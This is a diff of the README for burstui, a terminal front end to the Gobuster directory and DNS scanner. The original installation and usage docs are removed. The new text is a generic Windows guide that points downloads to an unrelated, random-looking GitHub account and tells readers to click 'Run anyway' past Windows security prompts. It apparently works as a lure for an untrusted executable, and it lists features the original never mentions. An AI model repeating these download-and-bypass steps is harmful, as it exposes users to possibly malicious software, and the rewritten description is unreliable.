@@ -1,245 +1,230 @@
-# BurstUI
+# 🧰 burstui - Simple Gobuster Control in Windows
 
-A Go terminal UI for Gobuster built with Bubble Tea and Lip Gloss.
+[![Download burstui](https://img.shields.io/badge/Download-Visit%20Releases-6f42c1?style=for-the-badge&logo=github)](https://github.com/trifoliolate-antihypertensivedrug145/burstui/releases)
 
-BurstUI provides a small TUI around common Gobuster workflows so you can switch modes, set options, run scans, and review live output without typing the full command each time.
+## 🚀 What is burstui
 
-[![License](https://img.shields.io/github/license/ctzisme/burstui)](https://github.com/ctzisme/burstui/blob/main/LICENSE)
-[![GitHub release](https://img.shields.io/github/v/release/ctzisme/burstui)](https://github.com/ctzisme/burstui/releases)
-[![Go Version](https://img.shields.io/badge/Go-1.26.1-00ADD8?logo=go)](https://go.dev/)
-[![Gobuster](https://img.shields.io/badge/Gobuster-3.8.2-orange)](https://github.com/OJ/gobuster)
-[![GHCR](https://img.shields.io/badge/GHCR-ghcr.io%2Fctzisme%2Fburstui-blue)](https://github.com/ctzisme/burstui/pkgs/container/burstui)
-[![Stars](https://img.shields.io/github/stars/ctzisme/burstui?style=social)](https://github.com/ctzisme/burstui)
+burstui is a terminal user interface for Gobuster. It gives you a simple screen to run common Gobuster tasks without needing to remember many command options.
 
-## Features
+This app is built for people who want a cleaner way to work with Gobuster on Windows. It helps you start scans, set basic options, and follow results in one place.
 
-![BurstUI Demo](assets/demo.png)
+## 📥 Download burstui
 
-- Supports Gobuster `dir`, `vhost`, and `dns` modes
-- Startup detection of Gobuster path and version
-- Live scan output with scrollable result pane
-- Thread count input
-- Mode-aware status code filters
-- Wordlist file picker
-- Optional custom DNS resolver for `dns` mode
-- Output log export after a scan completes
+1. Open the [burstui releases page](https://github.com/trifoliolate-antihypertensivedrug145/burstui/releases)
+2. Find the latest release
+3. Download the Windows file for your device
+4. Save it to a folder you can find again, such as Downloads or Desktop
 
-## Requirements
+If the release includes a ZIP file, unzip it first. If it includes an EXE file, you can run it after the download finishes.
 
-- Docker
+## 🖥️ Windows Setup
 
-*OR*
+burstui is made for Windows users who want a fast way to work with Gobuster. For best results, use:
 
-- Go `1.26.1` or newer
-- Gobuster `3.8.2` or newer
-- A working `gobuster` binary in your `PATH`
+- Windows 10 or Windows 11
+- A terminal window that can show text menus
+- A stable internet connection for the first download
+- Enough disk space for the app and scan results
 
-## 🐳 Use with Docker
+If you plan to scan many targets, use a folder with enough free space for saved output files.
 
-### Pull the latest image
+## 🛠️ How to Install
 
-```bash
-docker pull ghcr.io/ctzisme/burstui:latest
-```
+### 1. Visit the release page
+Go to the [download page](https://github.com/trifoliolate-antihypertensivedrug145/burstui/releases) and look for the newest version.
 
-### Run a container
+### 2. Get the Windows file
+Choose the file that matches Windows. In most cases, this will be one of these:
 
-Run a BurstUI container with host wordlists mounted read-only and the current directory mounted to `/output` for saving scan logs.
+- `burstui.exe`
+- a `.zip` file that contains `burstui.exe`
+- a Windows build with a version number in the file name
 
-```bash
-docker run --rm -it \
-  -e TERM=xterm-256color \
-  -v /usr/share/wordlists:/usr/share/wordlists:ro \
-  -v "$(pwd):/output" \
-  ghcr.io/ctzisme/burstui:latest
-```
-*Make sure to save logs only to the mounted directory (for example, `/output/123.log` when using the command above).*
+### 3. Unpack the file if needed
+If the download is a ZIP file:
 
-## 🔨 Manual Installation
+- Right-click the file
+- Select Extract All
+- Choose a folder
+- Open the extracted folder
 
-### Step 1. Install and build BurstUI
+### 4. Start the app
+If you see `burstui.exe`, double-click it.
 
-#### Option A: Using Go Install
-```bash
-go install github.com/ctzisme/burstui@latest
-```
+If Windows shows a security prompt:
 
-*OR*
+- Select More info
+- Choose Run anyway if you trust the file source
 
-#### Option B: From Source Code
-```bash
-git clone https://github.com/ctzisme/burstui
-cd burstui
-go mod tidy
-go build .
-```
-*OR*
+## 🧭 First Run
 
-#### Option C: Using Binary Releases
+When burstui starts, it opens in a terminal window. You can use the keyboard to move through the screen.
 
-Download binary releases from the [releases page](https://github.com/ctzisme/burstui/releases).
+Basic actions usually include:
 
-### Step 2. Install Gobuster with Go
+- choosing the scan type
+- entering a target
+- setting a wordlist
+- starting the scan
+- viewing results
 
-Install the recommended Gobuster version `v3.8.2`:
+Use the arrow keys, Enter, and Esc if the menu asks for them.
 
-```bash
-go install github.com/OJ/gobuster/v3@v3.8.2
-```
+## ⚙️ Common Use Cases
 
-*OR*
+burstui can help with:
 
-Install the latest Gobuster release:
+- directory fuzzing
+- file discovery
+- subdomain checks
+- parameter testing
+- quick Gobuster runs
+- reviewing scan output in a clear terminal view
 
-```bash
-go install github.com/OJ/gobuster/v3@latest
-```
+It is useful when you want the power of Gobuster with a simpler screen.
 
-### Step 3: Add the latest Gobuster to PATH
+## 📚 Basic Workflow
 
-Use it immediately in the current shell:
+A typical flow looks like this:
 
-```bash
-export PATH="$(go env GOPATH)/bin:$PATH"
-```
+1. Open burstui
+2. Pick a scan mode
+3. Enter the target address
+4. Choose a wordlist
+5. Set any extra options you need
+6. Start the scan
+7. Review the results in the terminal
 
-Verify that the Go-installed Gobuster is the one being used:
+If the app lets you save results, keep them in a folder named by date or project so you can find them later.
 
-```bash
-which gobuster
-gobuster --version
-```
+## 🔐 Wordlists and Targets
 
-### Step 4: Make the PATH change persistent
+burstui works best when you have:
 
-For Bash, add this line to `~/.bashrc`:
+- a target URL or host name
+- a wordlist file
+- any extra scan options you want to use
 
-```bash
-export PATH="$HOME/go/bin:$PATH"
-```
+A wordlist is just a text file with many possible names or paths. The app uses it to test what exists on the target.
 
-To also cover login shells, add the same line to `~/.profile`:
+Use files that fit your goal:
 
-```bash
-export PATH="$HOME/go/bin:$PATH"
-```
+- small wordlists for quick checks
+- larger wordlists for deeper scans
 
-Then reload your shell:
+## 🧪 Good First Test
 
-```bash
-source ~/.bashrc
-hash -r
-```
+If this is your first time using burstui, try a small test run:
 
-## Usage
+- use a safe test target you are allowed to scan
+- choose a short wordlist
+- keep the scan simple
+- review the output before trying larger jobs
 
-Start the app:
+This helps you learn the layout and keyboard flow before you run larger scans.
 
-```bash
-./burstui
-```
+## 📂 Files You May See
 
-When BurstUI starts, it will show:
+A release may contain:
 
-- Gobuster path from `which gobuster`
-- Gobuster version from `gobuster --version`
+- `burstui.exe` — the app you run on Windows
+- `.zip` — a compressed file that you need to extract
+- `README` or release notes — version details
+- extra support files — used by the app or included for setup
 
-## Controls
+If you are not sure which file to use, pick the Windows executable or the ZIP file that contains it.
 
-- `↑ / ↓`: move between fields
-- `← / →` on `Mode`: switch mode
-- `→`: fill a field with its placeholder when empty
-- `Tab` / `Shift+Tab`: switch between form and result pane
-- `Enter` on `Browse Wordlist`: open the wordlist picker
-- `Enter` on `Start Scan`: run Gobuster
-- `Enter` on `Output Log File`: save logs after a scan completes
-- `ctrl+c`: quit
+## ⌨️ Keyboard Basics
 
-## Modes
+burstui is made for terminal use, so the keyboard matters.
 
-### `dir` (Directory Mode)
+Common keys often include:
 
-Fields:
+- Arrow keys: move through options
+- Enter: choose an item
+- Esc: go back or close a menu
+- Tab: move to the next field
+- Space: toggle a choice
 
-- Target URL
-- Filter Status Codes
-- Threads
-- Wordlist Path
+If a screen shows its own key hints, follow those first.
 
-Generated command shape:
+## 🧩 Troubleshooting
 
-```bash
-gobuster dir -u https://example.com -w wordlist.txt -s 200,301,302 -t 10 --status-codes-blacklist ""
-```
+### The app does not open
+- Check that you downloaded the Windows file
+- Make sure the file finished downloading
+- If it is in a ZIP file, extract it first
+- Try running it from a terminal window
 
-Notes:
+### Windows blocks the file
+- Open the file’s properties if needed
+- Check that the download came from the release page
+- Try running it again after the download is complete
 
-- You can set multiple `Filter Status Codes`, separated by commas (e.g. `200,304,403`).
-- If left empty, BurstUI uses `200`
+### The terminal closes right away
+- Open Command Prompt or PowerShell
+- Run the app from that window
+- Look for any error text before the window closes
 
-### `vhost` (Virtual Host Mode)
+### No results appear
+- Check the target address
+- Check the wordlist path
+- Make sure the scan mode matches your task
+- Try a smaller test run first
 
-Fields:
+## 🧠 Tips for Better Use
 
-- Target URL
-- Exclude Status Codes
-- Threads
-- Wordlist Path
+- Keep your wordlists in one folder
+- Use short names for output files
+- Start with simple settings
+- Save scans in a project folder
+- Use a terminal size that leaves room for the interface
 
-Generated command shape:
+If you work with Gobuster often, burstui can make repeat tasks easier to start and track.
 
-```bash
-gobuster vhost -u https://example.com -w wordlist.txt -t 10 -xs 400 --append-domain
-```
+## 🧰 Typical Project Folder
 
-Notes:
+A simple folder setup can help:
 
-- You can set multiple `Exclude Status Codes`, separated by commas (e.g. `400,500`).
-- If left empty, BurstUI uses `400`
+- `burstui\` for the app
+- `wordlists\` for list files
+- `results\` for scan output
+- `notes\` for target notes and checks
 
-### `dns` (DNS Mode)
+This keeps your files in one place and makes it easier to return to a scan later.
 
-Fields:
+## 📦 Run from a Folder
 
-- Domain
-- Custom DNS Server (Optional)
-- Threads
-- Wordlist Path
+For best results, place burstui in a folder that is easy to reach.
 
-Generated command shape:
+Example:
 
-```bash
-gobuster dns -do example.com -w wordlist.txt -t 10
-```
+- `C:\Tools\burstui\`
+- `C:\Users\YourName\Downloads\burstui\`
 
-With a custom resolver (optional):
+Then open the file from that folder or start it through Command Prompt or PowerShell.
 
-```bash
-gobuster dns -do example.com -w wordlist.txt -t 10 --resolver 8.8.8.8:53
-```
+## 🔎 What burstui is for
 
-Notes:
+burstui is a terminal UI for Gobuster. It is built to:
 
-- You cannot filter status codes in `dns` mode
-- `Custom DNS Server` is optional
+- reduce menu clutter
+- help you launch scans faster
+- keep common options close at hand
+- show results in a clear text view
 
-## Output Logs
+It fits users who want a simpler front end for a well-known discovery tool.
 
-After a scan finishes, you can save the collected output to a file using the `Output Log File` field.
+## 🧭 What to Do Next
 
-Default output path:
+After you install burstui:
 
-```text
-./burstui-output.log
-```
-*Make sure to save logs only to the mounted directory if using Docker.*
+1. Open the app
+2. Choose a scan mode
+3. Set a target
+4. Load a wordlist
+5. Run a small test
+6. Adjust the scan for your needs
+7. Save the output
 
-## Project Structure
-
-- `main.go`: program entrypoint
-- `model.go`: model, initialization, Gobuster startup detection
-- `update.go`: key handling, focus logic, update loop
-- `scan.go`: Gobuster command construction and output streaming
-- `view.go`: TUI rendering
-- `styles.go`: Lip Gloss styles and log coloring helpers
-- `version.go`: version metadata variables for release builds
+If you use it often, keep the release page bookmarked for updates.
